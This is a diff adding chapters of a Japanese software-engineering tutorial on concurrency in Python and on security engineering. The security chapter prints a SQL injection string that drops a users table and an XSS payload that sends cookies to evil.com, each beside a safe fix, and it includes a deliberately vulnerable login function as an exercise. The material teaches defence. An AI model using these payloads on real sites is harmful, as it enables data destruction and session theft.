+  <label><input type="checkbox"><span>DNSがドメイン名をIPアドレスに変換する方法を説明できる</span></label>
+  <label><input type="checkbox"><span><code>curl -v</code>を使ってAPIコールをデバッグし、出力を読める</span></label>
+  <label><input type="checkbox"><span>401と403ステータスコードの違いを説明できる</span></label>
+  <label><input type="checkbox"><span>TLSが何をするか、なぜHTTPSが重要かを説明できる</span></label>
+  <label><input type="checkbox"><span>WebSocket対ポーリング対サーバー送信イベントをいつ使うかを知っている</span></label>
+  <label><input type="checkbox"><span>HTTPリクエストをすべてのネットワークレイヤーを通じてトレースできる</span></label>
+</div>
+
+</section>
+
+
+<!-- ===== CH 32 ===== -->
+<section id="ch32" data-ch="32">
+<h2><span class="ch-label">第32章</span> 並行性と並列処理</h2>
+
+<div role="note" class="callout info">
+<div class="callout-title">重要な概念</div>
+<p>モダンなアプリケーションは多くのことを同時に行います：複数のウェブリクエストの処理、複数のAPIからの同時データ取得、UIをレスポンシブに保ちながらのファイル処理。並行性を理解することで、フリーズせず、データを失わず、モダンなハードウェアを最大限に活用するアプリケーションが構築できます。</p>
+</div>
+
+<h3>三つのモデル：プロセス、スレッド、非同期</h3>
+
+<p>Pythonは複数のことを同時に行う三つの基本的な方法を提供します。それぞれが異なる状況に適しています。</p>
+
+<p><strong>プロセス（Processes）</strong>は別々のメモリ空間で動く完全に独立したプログラムです。複数のCPUコアで真に並行して実行できます。ただし作成コストが高く、プロセス間通信は複雑です。</p>
+
+<p><strong>スレッド（Threads）</strong>は単一プロセス内の軽量な実行単位です。メモリを共有するため通信は簡単ですが危険です（競合状態）。PythonではGILがCPUバウンドな作業でのスレッドの有効性を制限します。</p>
+
+<p><strong>非同期/await（Async/await）</strong>（協調マルチタスキング）は単一スレッドを使いますが、タスクがI/Oを待つたびに切り替えます。I/Oバウンドな作業には非常に効率的ですが、CPUバウンドなタスクを高速化することはできません。</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>ワークロードの種類による並行モデルの選択</caption>
+<thead><tr><th>ワークロード</th><th>最適なモデル</th><th>理由</th></tr></thead>
+<tbody>
+<tr><td>1000件の同時APIリクエスト</td><td><strong>非同期/await</strong></td><td>I/Oバウンド；非同期が待機を効率的に処理</td></tr>
+<tr><td>1000枚の画像を処理</td><td><strong>マルチプロセシング</strong></td><td>CPUバウンド；真の並列処理が必要</td></tr>
+<tr><td>共有インメモリキャッシュ</td><td><strong>スレッディング</strong>（ロックあり）</td><td>共有メモリが便利</td></tr>
+<tr><td>バックグラウンドクリーンアップジョブ</td><td><strong>スレッドまたはプロセス</strong></td><td>独立して実行される</td></tr>
+</tbody>
+</table>
+</div>
+
+<!-- Concurrency SVG Diagram -->
+<svg viewBox="0 0 700 300" aria-label="Diagram comparing sequential execution where all tasks run one after another, concurrent execution where tasks are interleaved on one core, and parallel execution where tasks run simultaneously on separate cores" style="width:100%;max-width:700px;margin:1.5rem auto;display:block">
+  <text x="100" y="25" class="label-text" text-anchor="middle" font-size="13" font-weight="600">Sequential</text>
+  <text x="360" y="25" class="label-text" text-anchor="middle" font-size="13" font-weight="600">Concurrent</text>
+  <text x="590" y="25" class="label-text" text-anchor="middle" font-size="13" font-weight="600">Parallel</text>
+
+  <!-- Sequential -->
+  <text x="15" y="62" class="sub-text" font-size="10">Core 1</text>
+  <rect x="50" y="45" width="80" height="25" rx="4" fill="var(--accent)" opacity="0.8"/>
+  <text x="90" y="62" text-anchor="middle" font-size="10" fill="var(--bg)">Task A</text>
+  <rect x="130" y="45" width="80" height="25" rx="4" fill="var(--accent)" opacity="0.55"/>
+  <text x="170" y="62" text-anchor="middle" font-size="10" fill="var(--bg)">Task B</text>
+  <rect x="210" y="45" width="80" height="25" rx="4" fill="var(--accent)" opacity="0.35"/>
+  <text x="250" y="62" text-anchor="middle" font-size="10" fill="var(--bg)">Task C</text>
+  <text x="100" y="93" class="sub-text" text-anchor="middle" font-size="10">Total: 3 time units</text>
+
+  <!-- Concurrent -->
+  <text x="265" y="140" class="sub-text" font-size="10">Core 1</text>
+  <rect x="300" y="125" width="28" height="24" rx="3" fill="var(--accent)" opacity="0.8"/>
+  <text x="314" y="141" text-anchor="middle" font-size="8" fill="var(--bg)">A</text>
+  <rect x="328" y="125" width="28" height="24" rx="3" fill="var(--accent)" opacity="0.55"/>
+  <text x="342" y="141" text-anchor="middle" font-size="8" fill="var(--bg)">B</text>
+  <rect x="356" y="125" width="28" height="24" rx="3" fill="var(--accent)" opacity="0.35"/>
+  <text x="370" y="141" text-anchor="middle" font-size="8" fill="var(--bg)">C</text>
+  <rect x="384" y="125" width="28" height="24" rx="3" fill="var(--accent)" opacity="0.8"/>
+  <text x="398" y="141" text-anchor="middle" font-size="8" fill="var(--bg)">A</text>
+  <rect x="412" y="125" width="28" height="24" rx="3" fill="var(--accent)" opacity="0.55"/>
+  <text x="426" y="141" text-anchor="middle" font-size="8" fill="var(--bg)">B</text>
+  <rect x="440" y="125" width="28" height="24" rx="3" fill="var(--accent)" opacity="0.35"/>
+  <text x="454" y="141" text-anchor="middle" font-size="8" fill="var(--bg)">C</text>
+  <text x="360" y="172" class="sub-text" text-anchor="middle" font-size="10">Still ~3 units, but all tasks make progress</text>
+
+  <!-- Parallel -->
+  <text x="510" y="215" class="sub-text" font-size="10">Core 1</text>
+  <rect x="550" y="200" width="120" height="22" rx="3" fill="var(--accent)" opacity="0.8"/>
+  <text x="610" y="215" text-anchor="middle" font-size="10" fill="var(--bg)">Task A</text>
+
+  <text x="510" y="242" class="sub-text" font-size="10">Core 2</text>
+  <rect x="550" y="227" width="120" height="22" rx="3" fill="var(--accent)" opacity="0.55"/>
+  <text x="610" y="242" text-anchor="middle" font-size="10" fill="var(--bg)">Task B</text>
+
+  <text x="510" y="269" class="sub-text" font-size="10">Core 3</text>
+  <rect x="550" y="254" width="120" height="22" rx="3" fill="var(--accent)" opacity="0.35"/>
+  <text x="610" y="269" text-anchor="middle" font-size="10" fill="var(--bg)">Task C</text>
+
+  <text x="590" y="295" class="sub-text" text-anchor="middle" font-size="10">Total: ~1 time unit (3x speedup)</text>
+
+  <line x1="230" y1="10" x2="230" y2="290" stroke="var(--a5)" stroke-width="1" stroke-dasharray="4,4"/>
+  <line x1="480" y1="10" x2="480" y2="290" stroke="var(--a5)" stroke-width="1" stroke-dasharray="4,4"/>
+</svg>
+
+<h3>PythonのGIL</h3>
+
+<p><strong>グローバルインタープリターロック（Global Interpreter Lock / GIL）</strong>はCPythonにあるミューテックスで、一度に一つのスレッドのみがPythonバイトコードを実行することを保証します。これはスレッドがCPUバウンドな作業で真の並列処理を達成できないことを意味します。</p>
+
+<p><strong>GILが防ぐもの：</strong>異なるコアで二つのスレッドが同時に数値計算を行うこと。</p>
+
+<p><strong>GILが防がないもの：</strong>I/Oバウンドな並行性。スレッドがネットワークレスポンスやディスク読み取りを待つとき、GILを解放して他のスレッドが実行できるようにします。これがスレッディングがI/Oタスクに対してまだ有効に機能する理由です。</p>
+
+<pre style="overflow-x:auto"><code>import threading
+import time
+
+# I/O-bound: threading helps (GIL released during sleep/network)
+def fetch_data(url):
+    time.sleep(1)  # Simulates network I/O
+    return f"Data from {url}"
+
+# CPU-bound: threading does NOT help (GIL blocks parallelism)
+def compute_heavy(n):
+    total = 0
+    for i in range(n):
+        total += i * i
+    return total</code></pre>
+
+<h3>スレッディング（Threading）</h3>
+
+<p>Pythonの<code>threading</code>モジュールを使うと関数を並行して実行できます。しかし同期なしでスレッド間の共有状態は危険です。</p>
+
+<pre style="overflow-x:auto"><code>import threading
+
+counter = 0  # Shared state &mdash; danger!
+
+def increment():
+    global counter
+    for _ in range(100000):
+        counter += 1  # NOT thread-safe!
+
+t1 = threading.Thread(target=increment)
+t2 = threading.Thread(target=increment)
+t1.start(); t2.start()
+t1.join(); t2.join()
+
+print(counter)  # Expected: 200000. Actual: something less!</code></pre>
+
+<p>修正は<strong>ロック（lock）</strong>の使用です：</p>
+
+<pre style="overflow-x:auto"><code>lock = threading.Lock()
+counter = 0
+
+def safe_increment():
+    global counter
+    for _ in range(100000):
+        with lock:  # Only one thread at a time
+            counter += 1</code></pre>
+
+<h3>非同期/await（Async/Await）</h3>
+
+<p><strong>非同期/await</strong>はPythonの協調マルチタスキングのシステムです。<strong>コルーチン（coroutine）</strong>（<code>async def</code>で定義）はI/Oを待つ間<code>await</code>で一時停止でき、同じスレッドで他のコルーチンを実行させます。</p>
+
+<pre style="overflow-x:auto"><code>import asyncio
+
+async def fetch_task(task_id):
+    print(f"Fetching task {task_id}...")
+    await asyncio.sleep(1)  # Non-blocking wait
+    print(f"Got task {task_id}")
+    return {"id": task_id, "title": f"Task {task_id}"}
+
+async def main():
+    # All three start concurrently, wait together
+    results = await asyncio.gather(
+        fetch_task(1),
+        fetch_task(2),
+        fetch_task(3),
+    )
+    # ~1 second total, not 3!
+    print(f"Got {len(results)} tasks")
+
+# asyncio.run(main())  # Starts the event loop</code></pre>
+
+<p><strong>イベントループ（event loop）</strong>は実行中のすべてのコルーチンを管理します。一つが<code>await</code>に達すると、ループに制御を返し、ループが他の準備完了コルーチンを実行します。</p>
+
+<h3>マルチプロセシング（Multiprocessing）</h3>
+
+<p>CPUバウンドな作業には、<code>multiprocessing</code>が個々のGILを持つ別々のPythonプロセスを生成します。複数のコアで真の並列処理が実現します。</p>
+
+<pre style="overflow-x:auto"><code>from multiprocessing import Pool
+
+def process_image(path):
+    """CPU-heavy image processing."""
+    # ... computation ...
+    return f"Processed {path}"
+
+# Process 8 images across 4 CPU cores
+with Pool(processes=4) as pool:
+    results = pool.map(process_image, [
+        "img1.png", "img2.png", "img3.png", "img4.png",
+        "img5.png", "img6.png", "img7.png", "img8.png",
+    ])
+# ~2x faster than sequential on 4 cores</code></pre>
+
+<h3>よくある並行性のバグ</h3>
+
+<p><strong>競合状態（Race condition）：</strong>二つのスレッドが同じデータを読み取り・変更・書き込みし、インターリーブによって誤った結果が生じます。修正：ロックまたはアトミック操作を使います。</p>
+
+<p><strong>デッドロック（Deadlock）：</strong>スレッドAがロック1を保持してロック2を待ちます。スレッドBがロック2を保持してロック1を待ちます。修正：常に同じグローバルな順序でロックを取得します。</p>
+
+<p><strong>スタベーション（Starvation）：</strong>スレッドが他のスレッドに先取りされ続けてリソースへのアクセスを得られません。修正：フェアロックまたは優先度キューを使います。</p>
+
+<p><strong>サンダリングハード（Thundering herd）：</strong>多くのスレッドが一つのリソースを争って同時に起動します（例：キャッシュが期限切れになり1000件のリクエストがすべて再生成しようとする）。修正：シングルフライトパターン — 一つのスレッドが再生成し、他は結果を待ちます。</p>
+
+<h3>パターン</h3>
+
+<h4>プロデューサー/コンシューマー（Producer/Consumer）</h4>
+
+<p>プロデューサーがキューに作業アイテムを追加し、コンシューマーが処理します。キューが生産と消費を疎結合にします。</p>
+
+<pre style="overflow-x:auto"><code>import queue
+import threading
+
+work_queue = queue.Queue()
+
+def producer():
+    for i in range(10):
+        work_queue.put(f"task-{i}")
+    work_queue.put(None)  # Sentinel: signals completion
+
+def consumer():
+    while True:
+        item = work_queue.get()
+        if item is None:
+            break
+        print(f"Processing {item}")
+        work_queue.task_done()</code></pre>
+
+<h4>スレッドプール（Thread Pool）</h4>
+
+<p>タスクごとにスレッドを作成する代わりに、固定されたプールを再利用します。Pythonの<code>concurrent.futures.ThreadPoolExecutor</code>がこれを提供します。</p>
+
+<pre style="overflow-x:auto"><code>from concurrent.futures import ThreadPoolExecutor, as_completed
+
+def fetch_url(url):
+    import time
+    time.sleep(0.5)
+    return f"Content from {url}"
+
+with ThreadPoolExecutor(max_workers=5) as executor:
+    futures = {executor.submit(fetch_url, u): u
+               for u in ["url1", "url2", "url3", "url4", "url5"]}
+
+    for future in as_completed(futures):
+        url = futures[future]
+        print(f"{url}: {future.result()}")</code></pre>
+
+<h4>ファンアウト/ファンイン（Fan-Out / Fan-In）</h4>
+
+<p><strong>ファンアウト：</strong>タスクを多くの並行サブタスクに分割します。<strong>ファンイン：</strong>結果を収集して結合します。これはMap-Reduce、並行ウェブスクレイピング、バッチ処理の背後にあるパターンです。</p>
+
+<div role="note" class="callout info">
+<div class="callout-title">重要な概念：TaskForgeとの関連</div>
+<p>TaskForgeのAPIサーバーが並行性をどのように使えるかを設計してください。Flaskの開発サーバーは一度に一つのリクエストを処理します。本番環境では、Gunicornが複数のワーカープロセスを生成します（マルチプロセシング）。「すべてのタスクをPDFでエクスポート」の場合はバックグラウンドスレッドプールを使うかもしれません。各シナリオに適した並行モデルをスケッチしてください。</p>
+</div>
+
+<div role="note" class="callout ok">
+<div class="callout-title">やってみよう：並行モデルを選ぶ</div>
+<p>各シナリオに最適なモデルを選んでください：</p>
+<ul>
+<li>インターネットから50ファイルを同時にダウンロード &rarr; <strong>非同期またはスレッディング</strong></li>
+<li>200枚の高解像度写真をリサイズ &rarr; <strong>マルチプロセシング</strong></li>
+<li>10,000件の接続を持つチャットサーバー &rarr; <strong>非同期</strong></li>
+<li>ページを取得してHTMLを解析するスクレイパー &rarr; <strong>取得には非同期 + 重い解析にはマルチプロセシング</strong></li>
+</ul>
+</div>
+
+<!-- Ch32 Quiz: GIL -->
+<div class="quiz" data-ch="32" data-ex="gil-bypass">
+  <h4>確認テスト</h4>
+  <p>CPUバウンドな作業で真の並列処理を達成するためにGILを回避するPythonの並行モデルはどれですか？</p>
+  <div class="quiz-options">
+    <button class="quiz-option" data-correct="false">threading</button>
+    <button class="quiz-option" data-correct="false">asyncio</button>
+    <button class="quiz-option" data-correct="true">multiprocessing</button>
+    <button class="quiz-option" data-correct="false">concurrent.futures.ThreadPoolExecutor</button>
+  </div>
+  <div class="quiz-feedback"></div>
+</div>
+
+<!-- Ch32 Quiz: Deadlock -->
+<div class="quiz" data-ch="32" data-ex="deadlock-cause">
+  <h4>確認テスト</h4>
+  <p>デッドロックの原因は何ですか？</p>
+  <div class="quiz-options">
+    <button class="quiz-option" data-correct="false">スレッドが無限ループを実行してCPUを100%消費する</button>
+    <button class="quiz-option" data-correct="true">二つのスレッドがそれぞれ相手が必要とするロックを保持し、両方が永遠に待つ</button>
+    <button class="quiz-option" data-correct="false">スレッドがロックを取得した後に解放するのを忘れる</button>
+    <button class="quiz-option" data-correct="false">あまりにも多くのスレッドが同時に同じリソースを競合する</button>
+  </div>
+  <div class="quiz-feedback"></div>
+</div>
+
+<!-- Ch32 Checklist -->
+<div class="checklist" data-ch="32" data-ex="concurrency-understanding">
+  <h4>並行性理解チェックリスト</h4>
+  <label><input type="checkbox"><span>並行性と並列処理の違いを説明できる</span></label>
+  <label><input type="checkbox"><span>GILとは何か、Pythonのスレッディングにどう影響するかを知っている</span></label>
+  <label><input type="checkbox"><span>特定のワークロードに対してスレッディング、非同期、マルチプロセシングを選べる</span></label>
+  <label><input type="checkbox"><span>競合状態とは何か、ロックがどう防ぐかを説明できる</span></label>
+  <label><input type="checkbox"><span>プロデューサー/コンシューマーパターンを説明できる</span></label>
+  <label><input type="checkbox"><span>デッドロックが起きる理由と防ぎ方を理解している</span></label>
+  <label><input type="checkbox"><span>非同期/awaitがスレッディングより優れている状況を知っている</span></label>
+</div>
+
+</section>
+
+
+<!-- ===== CH 33 ===== -->
+<section id="ch33" data-ch="33">
+<h2><span class="ch-label">第33章</span> セキュリティエンジニアリング</h2>
+
+<div role="note" class="callout info">
+<div class="callout-title">重要な概念</div>
+<p>すべてのWebアプリケーションは攻撃対象です。SQLインジェクション、パスワードの窃取、APIキーの漏洩&mdash;これらは毎日起きています。セキュリティは最後にボルトで留めるものではなく、すべてのコードに織り込まれるマインドセットです。この章では、攻撃者のように考え、エンジニアとして防御する方法を学びます。</p>
+</div>
+
+<h3>認証（Authentication）— あなたは誰ですか？</h3>
+
+<p><strong>認証（Authentication）</strong>は誰かの身元を確認します。最も一般的な形式はユーザー名とパスワードです。</p>
+
+<h4>パスワードのハッシュ化</h4>
+
+<p>第一のルール：<strong>パスワードを平文で保存しない</strong>。データベースが侵害された場合、すべてのユーザーのパスワードが露出します。代わりに<strong>ハッシュ</strong> — 一方向の数学的フィンガープリント — を保存します。</p>
+
+<pre style="overflow-x:auto"><code>import hashlib
+import os
+
+def hash_password(password, salt=None):
+    """Hash a password with a random salt."""
+    if salt is None:
+        salt = os.urandom(16)
+    hashed = hashlib.pbkdf2_hmac(
+        'sha256',
+        password.encode('utf-8'),
+        salt,
+        iterations=100000  # Slow on purpose!
+    )
+    return salt, hashed
+
+def verify_password(password, salt, stored_hash):
+    """Verify a password against a stored hash."""
+    _, new_hash = hash_password(password, salt)
+    return new_hash == stored_hash
+
+# Registration
+salt, hashed = hash_password("my_secret_password")
+# Store salt + hashed in database (NOT the plaintext password!)
+
+# Login
+is_valid = verify_password("my_secret_password", salt, hashed)  # True</code></pre>
+
+<p>主要な概念：</p>
+<ul>
+<li><strong>ソルト（Salt）：</strong>ハッシュ化前に各パスワードに追加されるランダムな値。二人のユーザーが同じパスワードを持っていても、ハッシュは異なります。レインボーテーブル（事前計算されたハッシュの対照表）攻撃も防ぎます。</li>
+<li><strong>低速ハッシュ化：</strong>bcrypt、scrypt、PBKDF2のようなアルゴリズムは意図的に遅く設計されています。これによりブルートフォース攻撃が現実的でなくなります：一つの推測のハッシュ化にミリ秒かかりますが、数十億の推測には何年もかかります。</li>
+<li><strong>ハッシュ化は暗号化ではありません：</strong>暗号化は可逆的（鍵で復号できる）です。ハッシュ化は一方向（元のデータを復元できない）です。</li>
+</ul>
+
+<h4>JWTトークン（JWT Tokens）</h4>
+
+<p><strong>JSON Webトークン（JSON Web Tokens / JWT）</strong>は認証情報を送信するコンパクトな方法です。JWTには三つのBase64エンコードされた部分があります：<code>header.payload.signature</code>。</p>
+
+<pre style="overflow-x:auto"><code># Conceptual JWT structure
+# Header:    {"alg": "HS256", "typ": "JWT"}
+# Payload:   {"user_id": 42, "role": "admin", "exp": 1711324800}
+# Signature: HMAC-SHA256(header + "." + payload, secret_key)
+
+# Server creates JWT after login:
+# token = jwt.encode({"user_id": 42, "exp": ...}, SECRET, algorithm="HS256")
+
+# Client sends in Authorization header:
+# Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+# Server verifies on each request:
+# data = jwt.decode(token, SECRET, algorithms=["HS256"])</code></pre>
+
+<h4>OAuth2フロー</h4>
+
+<p><strong>OAuth2</strong>はユーザーがパスワードをあなたと共有することなく、既存のアカウント（Google、GitHub）を使ってアプリにログインできるようにします。</p>
+
+<!-- OAuth2 SVG Diagram -->
+<svg viewBox="0 0 720 330" aria-label="OAuth2 authorisation code flow showing user visiting app, redirect to auth server, user login, callback with code, code exchange for token, then token used for API access" style="width:100%;max-width:720px;margin:1.5rem auto;display:block">
+  <rect x="10" y="15" width="120" height="42" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="70" y="41" class="label-text" text-anchor="middle" font-size="13" font-weight="600">User</text>
+
+  <rect x="290" y="15" width="140" height="42" rx="8" class="node-accent" stroke="var(--accent)" stroke-width="2"/>
+  <text x="360" y="41" class="label-text" text-anchor="middle" font-size="13" font-weight="600">Your App</text>
+
+  <rect x="580" y="15" width="130" height="42" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="645" y="36" class="label-text" text-anchor="middle" font-size="12" font-weight="600">Auth Server</text>
+  <text x="645" y="51" class="sub-text" text-anchor="middle" font-size="9">(Google, GitHub)</text>
+
+  <line x1="130" y1="80" x2="290" y2="80" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <text x="210" y="74" class="sub-text" text-anchor="middle" font-size="10">1. Click &ldquo;Login with Google&rdquo;</text>
+
+  <line x1="430" y1="100" x2="580" y2="100" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <text x="505" y="94" class="sub-text" text-anchor="middle" font-size="10">2. Redirect to login page</text>
+
+  <line x1="580" y1="130" x2="130" y2="130" class="arrow" stroke="var(--a5)" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arrowhead-muted)"/>
+  <text x="355" y="124" class="sub-text" text-anchor="middle" font-size="10">3. User enters credentials at auth server</text>
+
+  <line x1="580" y1="165" x2="430" y2="165" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <text x="505" y="159" class="sub-text" text-anchor="middle" font-size="10">4. Callback with auth code</text>
+
+  <line x1="430" y1="198" x2="580" y2="198" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <text x="505" y="192" class="sub-text" text-anchor="middle" font-size="10">5. Exchange code for token</text>
+
+  <line x1="580" y1="228" x2="430" y2="228" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <text x="505" y="222" class="sub-text" text-anchor="middle" font-size="10">6. Access token returned</text>
+
+  <line x1="430" y1="260" x2="580" y2="260" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <text x="505" y="254" class="sub-text" text-anchor="middle" font-size="10">7. Use token to get user data</text>
+
+  <line x1="290" y1="290" x2="130" y2="290" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <text x="210" y="284" class="sub-text" text-anchor="middle" font-size="10">8. User is logged in!</text>
+
+  <text x="360" y="322" class="sub-text" text-anchor="middle" font-size="10">Your app never sees the user&rsquo;s Google/GitHub password</text>
+</svg>
+
+<h3>認可（Authorisation）— 何ができますか？</h3>
+
+<p>認証 = 「あなたは誰ですか？」<strong>認可（Authorisation）</strong> = 「何をすることが許可されていますか？」</p>
+
+<h4>ロールベースアクセス制御（Role-Based Access Control / RBAC）</h4>
+
+<p>ユーザーは<strong>ロール</strong>（admin、editor、viewer）に割り当てられます。各ロールには特定の権限があります。</p>
+
+<pre style="overflow-x:auto"><code>PERMISSIONS = {
+    "admin":  ["create", "read", "update", "delete", "manage_users"],
+    "editor": ["create", "read", "update"],
+    "viewer": ["read"],
+}
+
+def check_permission(user_role, action):
+    allowed = PERMISSIONS.get(user_role, [])
+    if action not in allowed:
+        raise PermissionError(f"Role '{user_role}' cannot '{action}'")</code></pre>
+
+<h4>属性ベースアクセス制御（Attribute-Based Access Control / ABAC）</h4>
+
+<p><strong>ABAC</strong>は複数の属性に基づいて決定を行います：ユーザーの部署、リソースの分類、時間帯。</p>
+
+<pre style="overflow-x:auto"><code>def can_access_task(user, task):
+    """ABAC: access depends on multiple attributes."""
+    if user.role == "admin":
+        return True
+    if task.project_id in user.project_ids:
+        return True
+    if task.is_public:
+        return True
+    return False</code></pre>
+
+<p><strong>最小権限の原則（Principle of Least Privilege）</strong>：すべてのユーザー、プロセス、コンポーネントに必要最小限の権限だけを与えます。タスクを読み取るだけのAPIに書き込みアクセスは不要です。</p>
+
+<h3>暗号化（Encryption）</h3>
+
+<div style="overflow-x:auto">
+<table>
+<caption>暗号化の種類と使用タイミング</caption>
+<thead><tr><th>種類</th><th>鍵</th><th>速度</th><th>使用例</th></tr></thead>
+<tbody>
+<tr><td><strong>対称暗号化（AES）</strong></td><td>一つの共有鍵</td><td>高速</td><td>保存データ、VPN</td></tr>
+<tr><td><strong>非対称暗号化（RSA）</strong></td><td>公開鍵 + 秘密鍵のペア</td><td>低速</td><td>TLSハンドシェイク、署名</td></tr>
+<tr><td><strong>ハッシュ化（SHA-256）</strong></td><td>鍵なし（一方向）</td><td>高速</td><td>パスワード、データの整合性</td></tr>
+</tbody>
+</table>
+</div>
+
+<div role="note" class="callout warn">
+<div class="callout-title">注意</div>
+<p>「ハッシュ化は暗号化の一形態」というのは誤解です。暗号化は可逆的 — 正しい鍵で復号できます。ハッシュ化は一方向 — 元のデータを<strong>復元できません</strong>。パスワードはハッシュ化します（検証するだけでよい）。クレジットカード番号のような機密データは暗号化します（後で読む<em>必要がある</em>）。</p>
+</div>
+
+<h3>OWASPの主要な脆弱性</h3>
+
+<p>OWASP（Open Web Application Security Project）は最も重大なウェブセキュリティリスクの一覧を管理しています。必ず理解すべきトップ5を示します。</p>
+
+<h4>1. SQLインジェクション（SQL Injection）</h4>
+
+<p>攻撃者が入力フィールドに悪意のあるSQLを挿入します。文字列の連結でSQLを構築すると、攻撃者はデータベース全体を読み取り、変更、削除できます。</p>
+
+<pre style="overflow-x:auto"><code># VULNERABLE: string concatenation
+username = "admin'; DROP TABLE users; --"
+query = f"SELECT * FROM users WHERE username = '{username}'"
+# Becomes: SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; --'
+# Your entire users table is deleted!
+
+# SAFE: parameterised query
+cursor.execute(
+    "SELECT * FROM users WHERE username = ?",
+    (username,)
+)
+# The ? placeholder treats input as DATA, not SQL code</code></pre>
+
+<h4>2. 認証の欠陥（Broken Authentication）</h4>
+
+<p>弱いパスワード、レート制限の欠如、期限切れにならないトークン、安全でないパスワードリセットフロー。修正：強いパスワードの強制、MFAの使用、トークンの期限設定、ログイン試行のレート制限。</p>
+
+<h4>3. クロスサイトスクリプティング（Cross-Site Scripting / XSS）</h4>
+
+<p>攻撃者が他のユーザーが閲覧するページにJavaScriptを注入します。スクリプトが被害者のブラウザで実行され、Cookieやセッショントークンを盗みます。</p>
+
+<pre style="overflow-x:auto"><code># VULNERABLE: user input directly in HTML
+task_title = '&lt;script&gt;document.location="https://evil.com/?c="+document.cookie&lt;/script&gt;'
+html = f"&lt;h1&gt;{task_title}&lt;/h1&gt;"
+# The script executes in every viewer's browser!
+
+# SAFE: output encoding (escape HTML characters)
+from markupsafe import escape
+html = f"&lt;h1&gt;{escape(task_title)}&lt;/h1&gt;"
+# Renders as visible text, not executable code</code></pre>
+
+<h4>4. サーバーサイドリクエストフォージェリ（Server-Side Request Forgery / SSRF）</h4>
+
+<p>攻撃者がサーバーを騙して内部サービスへのリクエストを作らせます。アプリがユーザーが指定したURLを取得する場合、攻撃者が<code>http://localhost:5432</code>を提供して内部ネットワークを探索するかもしれません。修正：URLを検証してホワイトリスト化し、内部IPレンジをブロックします。</p>
+
+<h4>5. セキュリティの設定ミス（Security Misconfiguration）</h4>
+
+<p>デフォルトパスワードが変更されない、本番環境でデバッグモードが有効、詳細なスタックトレースがユーザーに表示される、不要なサービスが公開されている。修正：デフォルトを強化し、設定を監査し、デバッグ情報を絶対に公開しない。</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>OWASPトップ10の脆弱性6〜10と簡単な修正</caption>
+<thead><tr><th>#</th><th>脆弱性</th><th>簡単な修正</th></tr></thead>
+<tbody>
+<tr><td>6</td><td>脆弱で古いコンポーネント</td><td>定期的に依存関係を監査（<code>pip audit</code>）</td></tr>
+<tr><td>7</td><td>識別と認証の失敗</td><td>MFA、レート制限、安全なセッション</td></tr>
+<tr><td>8</td><td>ソフトウェアとデータの整合性の失敗</td><td>ダウンロードを検証し、署名付きパッケージを使う</td></tr>
+<tr><td>9</td><td>セキュリティのログ記録と監視の失敗</td><td>認証イベントをログ記録し、異常をアラート</td></tr>
+<tr><td>10</td><td>安全でない設計</td><td>デプロイ後ではなく設計時に脅威モデルを構築</td></tr>
+</tbody>
+</table>
+</div>
+
+<h3>セキュアなコーディングプラクティス</h3>
+
+<ul>
+<li><strong>入力検証：</strong>サーバーですべての入力を検証します。クライアント側の検証はUXです；サーバー側がセキュリティです。クライアントを絶対に信頼しないでください。</li>
+<li><strong>パラメータ化クエリ：</strong>常に。例外なし。ユーザー入力を含むすべてのSQLクエリはプレースホルダーを使う必要があります。</li>
+<li><strong>出力エンコーディング：</strong>XSSを防ぐためにHTMLでレンダリングする前にすべてのユーザー生成コンテンツをエンコードします。</li>
+<li><strong>依存関係の監査：</strong>依存関係の脆弱性を定期的にスキャンします。<code>pip audit</code>またはGitHub Dependabotを使います。</li>
+</ul>
+
+<h3>シークレット管理（Secrets Management）</h3>
+
+<p><strong>認証情報をバージョン管理にコミットしないでください。</strong>一度もないように、一時的にもいけません。Gitの履歴は永続的です — 削除後もシークレットは履歴に残ります。</p>
+
+<pre style="overflow-x:auto"><code># BAD: hardcoded secret
+API_KEY = "sk-live-abc123def456"
+
+# GOOD: environment variable
+import os
+API_KEY = os.environ.get("API_KEY")
+if not API_KEY:
+    raise RuntimeError("API_KEY not set")
+
+# BETTER: .env file (not committed) with python-dotenv
+# .env file (in .gitignore):
+# API_KEY=sk-live-abc123def456
+
+from dotenv import load_dotenv
+load_dotenv()
+API_KEY = os.environ["API_KEY"]</code></pre>
+
+<p>本番環境では、専用のシークレットストアを使います：AWS Secrets Manager、HashiCorp Vault、またはプラットフォーム組み込みのシークレット管理。</p>
+
+<div role="note" class="callout info">
+<div class="callout-title">重要な概念：TaskForgeとの関連</div>
+<p>TaskForgeに認証を追加してください：PBKDF2でパスワードハッシュ化を実装し、JWTトークンを返すログイン/登録エンドポイントを作成し、保護されたルートでトークンを確認するデコレーターを追加し、少なくとも「admin」と「viewer」ロールでRBACを実装します。次に、すべてのSQLクエリを監査して、文字列連結をパラメータ化クエリに置き換えてください。</p>
+</div>
+
+<div class="pq">「セキュリティはプロセスであって、製品ではない。」 &mdash; Bruce Schneier</div>
+
+<div role="note" class="callout ok">
+<div class="callout-title">やってみよう &mdash; 脆弱性を発見する</div>
+<p>このコードのすべてのセキュリティ問題を識別してください：</p>
+<pre style="overflow-x:auto"><code>@app.route("/login", methods=["POST"])
+def login():
+    username = request.form["username"]
+    password = request.form["password"]
+    user = db.execute(
+        f"SELECT * FROM users WHERE username = '{username}'"
+    ).fetchone()
+    if user and user["password"] == password:
+        session["user"] = username
+        return "Login successful"
+    return "Invalid credentials"</code></pre>
+<p>問題点：(1) f文字列によるSQLインジェクション、(2) 平文パスワードの比較、(3) レート制限なし、(4) CSRF保護なし。各問題をどのように修正しますか？</p>
+</div>
+
